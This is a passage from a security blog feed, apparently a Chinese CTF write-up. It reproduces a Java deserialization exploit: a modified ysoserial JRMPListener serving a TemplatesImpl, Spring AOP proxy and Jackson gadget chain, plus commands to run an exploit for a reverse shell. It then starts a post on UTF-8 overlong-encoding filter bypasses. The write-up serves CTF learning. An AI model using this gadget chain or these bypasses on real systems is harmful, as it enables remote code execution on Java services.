class="hljs-keyword">static</span> &lt;T&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj,String fname,T f)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> TemplatesImpl.class.getDeclaredField(fname);<br>        filed.setAccessible(<span class="hljs-literal">true</span>);<br>        filed.set(obj,f);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span> <span class="hljs-params">( <span class="hljs-keyword">final</span> String[] args )</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><span class="hljs-comment">//        if ( args.length &lt; 3 ) &#123;</span><br><span class="hljs-comment">//            System.err.println(JRMPListener.class.getName() + &quot; &lt;port&gt; &lt;payload_type&gt; &lt;payload_arg&gt;&quot;);</span><br><span class="hljs-comment">//            System.exit(-1);</span><br><span class="hljs-comment">//            return;</span><br><span class="hljs-comment">//        &#125;</span><br><br><span class="hljs-comment">//        final Object payloadObject = Utils.makePayloadObject(args[ 1 ], args[ 2 ]);</span><br>        <span class="hljs-comment">// åˆ é™¤writeReplace</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">wt</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(wt);<br>        ctClass0.toClass();<br><br>        <span class="hljs-comment">//æ„é€ æ¶æ„TemplatesImpl</span><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">tmp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(tmp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        setValue(tmp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;123&quot;</span>);<br>        setValue(tmp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,generateEvilBytes());<br><br>        <span class="hljs-comment">//ç¨³å®šè§¦å‘</span><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">support</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        support.setTarget(tmp);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>).getConstructor(AdvisedSupport.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(support);<br>        <span class="hljs-type">Templates</span> <span class="hljs-variable">proxy</span> <span class="hljs-operator">=</span> (Templates) Proxy.newProxyInstance(Templates.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,handler);<br><br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objmapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br>        <span class="hljs-type">ArrayNode</span> <span class="hljs-variable">arrayNode</span> <span class="hljs-operator">=</span>objmapper.createArrayNode();<br>        arrayNode.addPOJO(proxy);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">ex</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-string">&quot;1&quot;</span>); <span class="hljs-comment">//åå°„ç»•è¿‡æ„é€ æ–¹æ³•é™åˆ¶</span><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(ex,arrayNode);<br><br>        Object payloadObject=ex;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> Integer.parseInt(args[ <span class="hljs-number">0</span> ]);<br>            System.err.println(<span class="hljs-string">&quot;* Opening JRMP listener on &quot;</span> + port);<br>            <span class="hljs-type">JRMPListener</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPListener</span>(port, payloadObject);<br>            c.run();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            System.err.println(<span class="hljs-string">&quot;Listener error&quot;</span>);<br>            e.printStackTrace(System.err);<br>        &#125;<br><span class="hljs-comment">//        Utils.releasePayload(args[1], payloadObject);</span><br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span> <span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Socket</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-keyword">while</span> ( !<span class="hljs-built_in">this</span>.exit &amp;&amp; ( s = <span class="hljs-built_in">this</span>.ss.accept() ) != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        s.setSoTimeout(<span class="hljs-number">5000</span>);<br>                        <span class="hljs-type">InetSocketAddress</span> <span class="hljs-variable">remote</span> <span class="hljs-operator">=</span> (InetSocketAddress) s.getRemoteSocketAddress();<br>                        System.err.println(<span class="hljs-string">&quot;Have connection from &quot;</span> + remote);<br><br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> s.getInputStream();<br>                        <span class="hljs-type">InputStream</span> <span class="hljs-variable">bufIn</span> <span class="hljs-operator">=</span> is.markSupported() ? is : <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedInputStream</span>(is);<br><br>                        <span class="hljs-comment">// Read magic (or HTTP wrapper)</span><br>                        bufIn.mark(<span class="hljs-number">4</span>);<br>                        <span class="hljs-type">DataInputStream</span> <span class="hljs-variable">in</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataInputStream</span>(bufIn);<br>                        <span class="hljs-type">int</span> <span class="hljs-variable">magic</span> <span class="hljs-operator">=</span> in.readInt();<br><br>                        <span class="hljs-type">short</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> in.readShort();<br>                        <span class="hljs-keyword">if</span> ( magic != TransportConstants.Magic || version != TransportConstants.Version ) &#123;<br>                            s.close();<br>                            <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">sockOut</span> <span class="hljs-operator">=</span> s.getOutputStream();<br>                        <span class="hljs-type">BufferedOutputStream</span> <span class="hljs-variable">bufOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedOutputStream</span>(sockOut);<br>                        <span class="hljs-type">DataOutputStream</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataOutputStream</span>(bufOut);<br><br>                        <span class="hljs-type">byte</span> <span class="hljs-variable">protocol</span> <span class="hljs-operator">=</span> in.readByte();<br>                        <span class="hljs-keyword">switch</span> ( protocol ) &#123;<br>                            <span class="hljs-keyword">case</span> TransportConstants.StreamProtocol:<br>                                out.writeByte(TransportConstants.ProtocolAck);<br>                                <span class="hljs-keyword">if</span> ( remote.getHostName() != <span class="hljs-literal">null</span> ) &#123;<br>                                    out.writeUTF(remote.getHostName());<br>                                &#125; <span class="hljs-keyword">else</span> &#123;<br>                                    out.writeUTF(remote.getAddress().toString());<br>                                &#125;<br>                                out.writeInt(remote.getPort());<br>                                out.flush();<br>                                in.readUTF();<br>                                in.readInt();<br>                            <span class="hljs-keyword">case</span> TransportConstants.SingleOpProtocol:<br>                                doMessage(s, in, out, <span class="hljs-built_in">this</span>.payloadObject);<br>                                <span class="hljs-keyword">break</span>;<br>                            <span class="hljs-keyword">default</span>:<br>                            <span class="hljs-keyword">case</span> TransportConstants.MultiplexProtocol:<br>                                System.err.println(<span class="hljs-string">&quot;Unsupported protocol&quot;</span>);<br>                                s.close();<br>                                <span class="hljs-keyword">continue</span>;<br>                        &#125;<br><br>                        bufOut.flush();<br>                        out.flush();<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( InterruptedException e ) &#123;<br>                        <span class="hljs-keyword">return</span>;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>                        e.printStackTrace(System.err);<br>                    &#125;<br>                    <span class="hljs-keyword">finally</span> &#123;<br>                        System.err.println(<span class="hljs-string">&quot;Closing connection&quot;</span>);<br>                        s.close();<br>                    &#125;<br><br>                &#125;<br><br>            &#125;<br>            <span class="hljs-keyword">finally</span> &#123;<br>                <span class="hljs-keyword">if</span> ( s != <span class="hljs-literal">null</span> ) &#123;<br>                    s.close();<br>                &#125;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">this</span>.ss != <span class="hljs-literal">null</span> ) &#123;<br>                    <span class="hljs-built_in">this</span>.ss.close();<br>                &#125;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( SocketException e ) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace(System.err);<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doMessage</span> <span class="hljs-params">( Socket s, DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.err.println(<span class="hljs-string">&quot;Reading message...&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">op</span> <span class="hljs-operator">=</span> in.read();<br><br>        <span class="hljs-keyword">switch</span> ( op ) &#123;<br>            <span class="hljs-keyword">case</span> TransportConstants.Call:<br>                <span class="hljs-comment">// service incoming RMI call</span><br>                doCall(in, out, payload);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.Ping:<br>                <span class="hljs-comment">// send ack for ping</span><br>                out.writeByte(TransportConstants.PingAck);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">case</span> TransportConstants.DGCAck:<br>                <span class="hljs-type">UID</span> <span class="hljs-variable">u</span> <span class="hljs-operator">=</span> UID.read(in);<br>                <span class="hljs-keyword">break</span>;<br><br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;unknown transport op &quot;</span> + op);<br>        &#125;<br><br>        s.close();<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doCall</span> <span class="hljs-params">( DataInputStream in, DataOutputStream out, Object payload )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(in) &#123;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">protected</span> Class&lt;?&gt; resolveClass ( ObjectStreamClass desc ) <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>                <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;[Ljava.rmi.server.ObjID;&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID[].class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;java.rmi.server.ObjID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> ObjID.class;<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( <span class="hljs-string">&quot;java.rmi.server.UID&quot;</span>.equals(desc.getName())) &#123;<br>                    <span class="hljs-keyword">return</span> UID.class;<br>                &#125;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IOException</span>(<span class="hljs-string">&quot;Not allowed to read object&quot;</span>);<br>            &#125;<br>        &#125;;<br><br>        ObjID read;<br>        <span class="hljs-keyword">try</span> &#123;<br>            read = ObjID.read(ois);<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( java.io.IOException e ) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarshalException</span>(<span class="hljs-string">&quot;unable to read objID&quot;</span>, e);<br>        &#125;<br><br><br>        <span class="hljs-keyword">if</span> ( read.hashCode() == <span class="hljs-number">2</span> ) &#123;<br>            ois.readInt(); <span class="hljs-comment">// method</span><br>            ois.readLong(); <span class="hljs-comment">// hash</span><br>            System.err.println(<span class="hljs-string">&quot;Is DGC call for &quot;</span> + Arrays.toString((ObjID[])ois.readObject()));<br>        &#125;<br><br>        System.err.println(<span class="hljs-string">&quot;Sending return with payload for obj &quot;</span> + read);<br><br>        out.writeByte(TransportConstants.Return);<span class="hljs-comment">// transport op</span><br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JRMPClient</span>.MarshalOutputStream(out, <span class="hljs-built_in">this</span>.classpathUrl);<br><br>        oos.writeByte(TransportConstants.ExceptionalReturn);<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">UID</span>().write(oos);<br><br><span class="hljs-comment">//        BadAttributeValueExpException ex = new BadAttributeValueExpException(null);</span><br><span class="hljs-comment">//        Reflections.setFieldValue(ex, &quot;val&quot;, payload);</span><br>        oos.writeObject(payload);<span class="hljs-comment">//ç›´æ¥å†™æˆå‹çš„payloadè¿‡å»å³å¯</span><br><br>        oos.flush();<br>        out.flush();<br><br>        <span class="hljs-built_in">this</span>.hadConnection = <span class="hljs-literal">true</span>;<br>        <span class="hljs-keyword">synchronized</span> ( <span class="hljs-built_in">this</span>.waitLock ) &#123;<br>            <span class="hljs-built_in">this</span>.waitLock.notifyAll();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@SuppressWarnings(&#123;&quot;deprecation&quot;&#125;)</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">makeDummyObject</span> <span class="hljs-params">(String className)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">isolation</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassLoader</span>() &#123;&#125;;<br>            <span class="hljs-type">ClassPool</span> <span class="hljs-variable">cp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassPool</span>();<br>            cp.insertClassPath(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ClassClassPath</span>(Dummy.class));<br>            <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> cp.get(Dummy.class.getName());<br>            clazz.setName(className);<br>            <span class="hljs-keyword">return</span> clazz.toClass(isolation).newInstance();<br>        &#125;<br>        <span class="hljs-keyword">catch</span> ( Exception e ) &#123;<br>            e.printStackTrace();<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">0</span>];<br>        &#125;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Dummy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åä½¿ç”¨è¯¥å‘½ä»¤é‡æ–°æ‰“åŒ…ä¸€ä¸‹</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">mvn clean package -DskipTests  <span class="hljs-comment"># è¿™é‡Œä¸è·³è¿‡æµ‹è¯•ä¼šæŠ¥é”™ï¼Œå› ä¸ºä¸çŸ¥é“ç‰ˆæœ¬åŸå› è¿˜æ˜¯æ€ä¹ˆçš„å¾ˆå¤šä¾èµ–å’Œæ’ä»¶çˆ†çº¢</span><br></code></pre></td></tr></table></figure><p>ç„¶åç”¨ä¸‹é¢çš„å‘½ä»¤å¼€å¯JRMPæœåŠ¡å™¨</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 80<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026144410160.png" alt="image-20241026144410160"></p><p>ç„¶åæ­¤æ—¶æ‰“expåå¼¹shell</p><p>expæ‰§è¡Œå‘½ä»¤å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python .\exp.py <span class="hljs-string">&quot;http://7ae47afd-3eda-472c-9c1b-7ce01d6a534f.node5.buuoj.cn&quot;</span> <span class="hljs-string">&quot;&lt;vpsåœ°å€&gt;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241026153215483.png" alt="image-20241026153215483"></p><p><img src="https://cdn.clown2024.cn/image-20241026153245566.png" alt="image-20241026153245566"></p><p><img src="https://cdn.clown2024.cn/image-20241026153257626.png" alt="image-20241026153257626"></p><p>å¼¹shellè¿‡æ¥æ‹¿åˆ°flag</p><blockquote><p>è‰¹äº†æ‰“expçš„æ—¶å€™ä¸€ç›´å†™é”™æœåŠ¡å™¨åœ°å€è ¢äº†ï¼Œå¤šåŠ äº†ä¸€ä¸ªhttp:&#x2F;&#x2F;ï¼Œç›´æ¥å†™ipå°±è¡Œäº†</p><p>è¿˜æœ‰ä¸€ç‚¹æ˜¯rmi:&#x2F;&#x2F;&lt;æœåŠ¡å™¨åœ°å€&gt;&#x2F;a è¿™é‡Œè¦åŠ ä¸€ä¸ªè®¿é—®è·¯å¾„ï¼Œä¸ç„¶ä¹Ÿä¼šæ”¶ä¸åˆ°payloadï¼Œè¿™æˆ‘åœ¨æœ¬åœ°æµ‹è¯•è¿‡ï¼Œæˆ‘ä¹Ÿä¸æ¸…æ¥šä¸ºå•¥ï¼Œå¯ä»¥è·ŸJRMPçš„æ¨¡å—å®ç°æœ‰å…³ï¼Œè¿™éƒ¨åˆ†åé¢å­¦ä¹ JRMPæ¨¡å—çš„æ—¶å€™å†æ¢ç©¶ä¸€ä¸‹</p></blockquote><p>è¿™é¢˜å¤ç°çœŸçš„æ›²æŠ˜ï¼Œwpå†™çš„è¿‡äºç®€ç•¥è®©æˆ‘è¿™ä¸ªèœé¸¡çœ‹ä¸å¤ªæ‡‚ğŸ˜­</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜ç›®å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UTF-8 Overlong Encodingç»•è¿‡å­¦ä¹ </title>
      <link href="/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/20/UTF-8-Overlong-Encoding%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>ä¹‹å‰åªæ˜¯æµ…æµ…çš„çŸ¥é“è¿™ä¸ªä¸œè¥¿ï¼Œç°åœ¨æ¥æ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œå› ä¸ºåœ¨javaé¢˜ç›®ä¸­æœ‰æ—¶ä¼šç”¨åˆ°è¯¥æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡</p><h1 id="utf-8ç¼–ç è¿‡ç¨‹"><a href="#UTF-8ç¼–ç è¿‡ç¨‹" class="headerlink" title="UTF-8ç¼–ç è¿‡ç¨‹"></a>UTF-8ç¼–ç è¿‡ç¨‹</h1><p>UTF-8ï¼ˆ8-bit Unicode Transformation Formatï¼‰æ˜¯ä¸€ç§ç”¨äºç¼–ç Unicodeå­—ç¬¦çš„å¯å˜é•¿åº¦å­—ç¬¦ç¼–ç æ–¹æ¡ˆã€‚å®ƒèƒ½å¤Ÿè¡¨ç¤ºUnicodeå­—ç¬¦é›†ä¸­çš„æ¯ä¸ªå­—ç¬¦ï¼Œå¹¶ä¸”ä¸ASCIIç¼–ç å…¼å®¹ã€‚</p><p>å®ƒå¯ä»¥å°†Unicodeé‡Œçš„æ‰€æœ‰å­—ç¬¦è½¬æ¢æˆ1åˆ°4ä¸ªå­—èŠ‚æ¥è¡¨ç¤º</p><p>ä¸‹é¢æ˜¯ä¸€ä¸ªUnicodeå¯¹åº”UTF-8çš„è½¬æ¢è¡¨</p><p><img src="https://cdn.clown2024.cn/202410202132477.png" alt="image-20241020213226571"></p><ul><li>å¸¸è§çš„ASCIIå­—ç¬¦ï¼ˆU+0000åˆ°U+007Fï¼‰ç”¨1ä¸ªå­—èŠ‚è¡¨ç¤ºã€‚</li><li>å…¶ä»–Unicodeå­—ç¬¦æ ¹æ®å…¶èŒƒå›´ä½¿ç”¨2åˆ°4ä¸ªå­—èŠ‚ã€‚</li></ul><p>ä»¥æ¬§å…ƒç¬¦å·â‚¬æ¥ä¸¾ä¾‹ï¼Œè¯¥ç¬¦å·çš„Unicodeç¼–ç ä¸ºU+20ACï¼Œä½äºU+0800å’ŒU+FFFFä¹‹é—´ï¼Œæ‰€ä»¥ä¸ºä¸‰ä¸ªå­—èŠ‚ï¼Œç¼–ç é•¿åº¦ä¸º3ï¼Œ0x20ACçš„äºŒè¿›åˆ¶ä¸º<strong>10 0000 1010 1100</strong></p><p>ç„¶åæ ¹æ®æ¯ä¸ªå­—èŠ‚ç¼ºçš„ä½æ•°ï¼Œä»å·¦è‡³å³æŒ‰é¡ºåºåˆ†æˆä¸‰ç»„ï¼Œç¬¬ä¸€ç»„é•¿åº¦ä¸æ»¡åœ¨å‰é¢è¡¥é›¶ï¼š0010ï¼Œ000010ï¼Œ101100</p><p>ç„¶åå¡«è¿›å»ï¼Œè½¬æ¢æˆåå…­è¿›åˆ¶ï¼Œæ¬§å…ƒç¬¦å·çš„UTF-8ç¼–ç å°±æ˜¯<strong>\xE2\x82\xAC</strong></p><p>pythonæ¥decodeéªŒè¯ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410202147505.png" alt="image-20241020214652039"></p><h1 id="overlong-encodingç»•è¿‡åŸç†"><a href="#Overlong-Encodingç»•è¿‡åŸç†" class="headerlink" title="Overlong Encodingç»•è¿‡åŸç†"></a>Overlong Encodingç»•è¿‡åŸç†</h1><p>Overlong Encodingå°±æ˜¯å°†ä¸€ä¸ªå­—èŠ‚çš„å­—ç¬¦æŒ‰ç…§UTF-8çš„ç¼–ç å½¢å¼å¼ºè¡Œç¼–ç æˆä¸¤ä¸ªå­—ç¬¦</p><p>æ¯”å¦‚â€.â€è¿™ä¸ªå­—ç¬¦æ­£å¸¸Unicodeç¼–ç ä¸º0x2Eï¼ŒæŒ‰ç…§utf-8çš„å½¢å¼åªèƒ½è¢«ç¼–ç ä¸ºä¸€ä¸ªå­—èŠ‚ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸¤ä¸ªå­—èŠ‚çš„ç¼–ç å½¢å¼ï¼Œé€šè¿‡è¡¥0å¼ºè¡Œåˆ†æˆä¸¤ç»„</p><p>0x2Eçš„äºŒè¿›åˆ¶æ˜¯10 1110ï¼Œç°åœ¨ç›´æ¥å‰é¢è¡¥5ä¸ª0ï¼Œå˜æˆ00000 101110è¿™æ ·çš„ä¸¤ç»„ï¼Œç„¶åä»–çš„UTF-8çš„ç¼–ç å½¢å¼å°±å˜æˆ<strong>\xC0\xAE</strong></p><p>ä½†æ˜¯è¿™ä¸ªç¼–ç å¹¶ä¸æ˜¯ä¸€ä¸ªåˆæ³•çš„UTF-8ç¼–ç ï¼Œæœ‰äº›è¯­è¨€åœ¨è½¬æ¢çš„æ—¶å€™ä¼šè¿›è¡Œæ£€æŸ¥æ¯”å¦‚pythonï¼›è€Œæœ‰äº›åˆ™å¯¹è¯¥æ£€æŸ¥å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´èƒ½å¤Ÿæ­£å¸¸è§£æå‡ºæ¥ï¼Œæ¯”å¦‚javaï¼Œè¿™å°±é€ æˆ<strong>Overlong Encodingç»•è¿‡</strong></p><p>pythonè¿›è¡Œè§£ç çš„è¯ä¼šæŠ¥ä¸‹é¢çš„é”™è¯¯</p><p><img src="https://cdn.clown2024.cn/202410202204297.png" alt="image-20241020220411264"></p><p>ä¼šç›´æ¥è¯´éæ³•å­—èŠ‚ï¼Œæ— æ³•è½¬æ¢ç¼–ç </p><p>è¯¥ç»•è¿‡æ–¹å¼ä¼šåœ¨ä¸€äº›ç›®å½•ç©¿è¶Šçš„æ—¶å€™ç”¨åˆ°ï¼Œæ¯”å¦‚ç”¨%C0%AEæ¥ä»£æ›¿.ï¼Œæ¥ç»•è¿‡å¯¹ç›®å½•ç©¿è¶Šçš„é™åˆ¶ï¼ŒåŸå› å°±æ˜¯è¯¥æœåŠ¡åœ¨è·¯å¾„è§£ç æ—¶ä½¿ç”¨UTF-8ç¼–ç </p><h1 id="overlong-encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"><a href="#Overlong-Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨" class="headerlink" title="Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨"></a>Overlong Encodingåœ¨javaä¸­çš„ç»•è¿‡åˆ©ç”¨</h1><p>åœ¨javaçš„wafä¸­é€šå¸¸æ˜¯æ£€æŸ¥åºåˆ—åŒ–çš„å­—èŠ‚æµä¸­æ˜¯å¦æœ‰æ•æ„Ÿç±»æ¥è¿›è¡Œè¿‡æ»¤ï¼Œæ¯”å¦‚é‡å†™resolveClassæ¥æ·»åŠ é»‘åå•ï¼Œå¦‚æœèƒ½å¤Ÿè¿›è¡ŒäºŒæ¬¡ååºåˆ—åŒ–å¯èƒ½æœ‰æœºä¼šç»•è¿‡ä¸€äº›å…³é”®ç±»ï¼Œä½†å¦‚æœç¦ç”¨å¾—å¤ªæ­»å°±è½®åˆ°Overlong Encodingæ–¹æ³•æ¥å¤§æ˜¾èº«æ‰‹äº†ã€‚</p><blockquote><p>å›æ¥è¡¥å……äº†ï¼š</p><p>è¿™é‡Œæœ‰ä¸ªåœ°æ–¹å¾—çº æ­£ä¸€ä¸‹ï¼Œå¦‚æœé‡å†™äº†resolveClassçš„è¯ï¼Œæˆ‘ä»¬æ˜¯æ— æ³•ç”¨utf-8æ¥ç»•è¿‡çš„ï¼Œå› ä¸ºresolveClasså·²ç»æ˜¯åœ¨ç±»çš„é“¾æ¥é˜¶æ®µäº†ï¼Œæ­¤æ—¶utf-8çš„è§£æå·²ç»è¿‡äº†ï¼Œæ‰€ä»¥åœ¨resolveClassçš„æ—¶å€™è¿˜æ˜¯èƒ½å¤Ÿçœ‹åˆ°å®Œæ•´çš„ç±»å</p><p>UTF-8åªé€‚ç”¨äºç›´æ¥å¯¹å­—èŠ‚æµè¿‡æ»¤çš„æƒ…å†µ</p></blockquote><h2 id="ç»•è¿‡åˆ†æ"><a href="#ç»•è¿‡åˆ†æ" class="headerlink" title="ç»•è¿‡åˆ†æ"></a>ç»•è¿‡åˆ†æ</h2><p>æˆ‘ä»¬çŸ¥é“åœ¨åºåˆ—åŒ–çš„æ—¶å€™ï¼Œç±»åæ˜¯ç›´æ¥æ˜æ–‡å¯è¯»ï¼Œwafæ£€æµ‹ä¹Ÿæ˜¯åŸºäºæ­¤å½¢å¼ï¼Œé‚£ç»•è¿‡çš„æ€è·¯å°±æ˜¯åˆ©ç”¨Overlong Encodingæ¥ç¼–ç 